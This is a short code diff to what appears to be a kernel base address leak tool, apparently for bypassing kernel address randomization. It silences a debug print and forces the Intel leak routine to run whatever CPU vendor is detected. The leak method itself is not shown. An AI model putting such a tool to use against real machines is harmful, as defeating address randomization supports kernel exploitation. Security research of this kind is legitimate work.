@@ -608,7 +608,7 @@ void save_bmp(char* bmp_name, INT64* data, size_t len) {
     if (common == 0) { common = 1; }
     double min = common / 2;
     double max = common * 2;
-    printf("Min: %f Max: %f  Common: %d \r\n", min, max, common);
+    //printf("Min: %f Max: %f  Common: %d \r\n", min, max, common);
     char color[3];
 
     for (UINT64 i = 0; i < len; i++)
@@ -838,7 +838,7 @@ CPU_VENDOR determine_cpu_vendor()
 
 UINT64 leak_kernel_base_reliable()
 {
-    CPU_VENDOR vendor = determine_cpu_vendor();
+    CPU_VENDOR vendor = CpuUnknown; //determine_cpu_vendor();
     UINT64 kernel_base = 0;
     if (vendor == CpuAmd)
     {
@@ -863,7 +863,8 @@ UINT64 leak_kernel_base_reliable()
     else
     {
         printf("Unknown CPU vendor!\n");
-        return 0;
+        kernel_base = leak_kernel_base_intel_strip();
+        //return 0;
     }
 
     return kernel_base;
